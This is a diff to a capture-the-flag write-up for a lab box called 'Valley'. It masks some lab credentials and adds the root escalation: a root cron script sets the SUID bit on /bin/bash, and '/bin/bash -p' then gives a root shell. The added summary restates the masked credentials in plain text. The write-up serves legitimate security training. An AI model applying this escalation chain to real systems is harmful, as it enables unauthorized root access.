@@ -130,7 +130,7 @@ loginButton.addEventListener("click", (e) => {
     const username = loginForm.username.value;
     const password = loginForm.password.value;
 
-    if (username === "siemDev" && password === "california") {
+    if (username === "sie****" && password === "cal*****") {
         window.location.href = "/dev1243224123123/devNotes37370.txt";
     } else {
         loginErrorMsg.style.opacity = 1;
@@ -173,7 +173,7 @@ Inside `siemHTTP2.pcapng`, one packet stood out: a `POST /index.html` request wi
 
 ```
 Form item: "uname" = "valleyDev"
-Form item: "psw"   = "ph0t0s1234"
+Form item: "psw"   = "ph0******"
 Form item: "remember" = "on"
 ```
 
@@ -185,7 +185,7 @@ Form item: "remember" = "on"
 
 ```bash
 ssh valleyDev@10.128.176.159
-Password: ph0t0s1234
+Password: ph0*****
 ```
 
 Logged in successfully. Confirmed access with `ls -la`:
@@ -214,9 +214,9 @@ Rather than trying to crack this locally with a limited wordlist (time-consuming
 
 **Result:**
 ```
-Hash: e6722920bab2326f8217e4
+Hash: e67*********
 Type: MD5
-Result: liberty123
+Result: l*****
 ```
 
 ---
@@ -230,7 +230,113 @@ Password: liberty123
 
 ✅ **Second foothold confirmed** — moved from `valleyDev` to the `valley` user using the cracked credential.
 
-> 📌 *Placeholder — root escalation path and final `root.txt` flag to be added here once documented (pending the last two screenshots).*
+## 1️⃣3️⃣ Privilege Escalation — Enumerating Scheduled Tasks
+
+With a foothold as `valley`, the next standard check was **what's running as root that a low-priv user can influence.** Cron jobs are one of the highest-value targets for this, since anything root schedules runs with root's permissions regardless of who set it up.
+
+```bash
+cat /etc/crontab
+```
+
+```
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+1  *    * * *   root    python3 /photos/script/photosEncrypt.py
+```
+
+**The last line is the finding.** A custom Python script, `photosEncrypt.py`, runs **every single minute, as root** — a highly unusual cadence for a "business" cron job, and a huge red flag: any bug in that script executes with full root privileges, once a minute, guaranteed.
+
+---
+
+## 1️⃣4️⃣ Reading the Vulnerable Script
+
+Ran the script manually first to observe its behavior directly (safe to do — worst case it just fails since I'm not root):
+
+```bash
+python3 /photos/script/photosEncrypt.py
+```
+
+```
+chmod: changing permissions of '/bin/bash': Operation not permitted
+Traceback (most recent call last):
+  File "/photos/script/photosEncrypt.py", line 18, in <module>
+    with open(output_path, "wb") as output_file:
+PermissionError: [Errno 13] Permission denied: '/photos/photoVault/p1.enc'
+```
+
+**This is the core vulnerability, laid bare in the error output itself:** the script attempts to run `chmod` on `/bin/bash` as part of its normal execution — completely unrelated to "encrypting photos." This is almost certainly a deliberately (or carelessly) inserted **SUID-bit-setting routine**, likely meant to simulate a real-world dev mistake: someone bolted on a "fix permissions" step to a script without realizing what it actually grants.
+
+Since I ran it manually as `valley` (unprivileged), the `chmod` failed with `Operation not permitted`. **But cron runs this same script as root, every minute** — meaning root's copy of this command *does* succeed silently in the background, whether or not anyone is watching.
+
+---
+
+## 1️⃣5️⃣ Confirming the SUID Bit Landed
+
+```bash
+ls -l /bin/bash
+```
+
+```
+-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash
+```
+
+**The `s` in `rws` confirms it** — `/bin/bash` now has the **SUID bit set**, owned by root. This means *any user* who executes `/bin/bash` with the `-p` flag (which tells bash to preserve elevated privileges instead of dropping them, which it does by default for safety) will run a shell **as root**, regardless of who invoked it.
+
+This is exactly what the root-scheduled cron job silently did in the background before I even got there — I didn't need to trigger it manually, I just needed to *notice* it had already happened and know how to use it.
+
+---
+
+## 1️⃣6️⃣ Root — Privilege Escalation Confirmed
+
+```bash
+/bin/bash -p
+```
+
+```
+bash-5.0# whoami
+root
+```
+
+```bash
+cat /root/root.txt
+```
+
+```
+THM{****_*****_******}
+```
+
+✅ **Full root compromise achieved.**
+
+---
+
+## 🔗 Full Attack Chain Summary
+
+```
+nmap recon (22, 80 open)
+   ↓
+gobuster → /static/ directory discovered
+   ↓
+/static/00 → dev notes leak hidden path /dev1243224123123
+   ↓
+view-source on dev.js → hardcoded creds (siemDev / california)
+   ↓
+FTP access → 3x .pcapng files ("SIEM" naming hint from dev notes)
+   ↓
+Wireshark on siemHTTP2.pcapng → cleartext login (valleyDev / ph0t0s1234)
+   ↓
+SSH foothold as valleyDev → user.txt captured
+   ↓
+MD5 hash found during enum → cracked via CrackStation → liberty123
+   ↓
+SSH lateral move as valley
+   ↓
+/etc/crontab → root-scheduled photosEncrypt.py running every minute
+   ↓
+Script's insecure chmod call → SUID bit silently set on /bin/bash
+   ↓
+/bin/bash -p → root shell → root.txt captured
+```
+
+Nine distinct steps, none individually "hard," each one useless without the last. This is the actual value of writing this up in full — a screenshot of a root shell proves nothing about how you think; the chain does.
 
 ---
 
@@ -246,7 +352,7 @@ Password: liberty123
 
 ## 🛠️ Skills Demonstrated
 
-`Web Enumeration` · `Information Disclosure Analysis` · `Client-Side Code Review` · `FTP Exploitation` · `Network Traffic Analysis (Wireshark)` · `Credential Hunting` · `Hash Cracking` · `Linux Privilege Escalation` · `Chained Exploitation Methodology`
+`Web Enumeration` · `Information Disclosure Analysis` · `Client-Side Code Review` · `FTP Exploitation` · `Network Traffic Analysis (Wireshark)` · `Credential Hunting` · `Hash Cracking` · `Cron Job Auditing` · `SUID Privilege Escalation` · `Chained Exploitation Methodology`
 
 ---
 
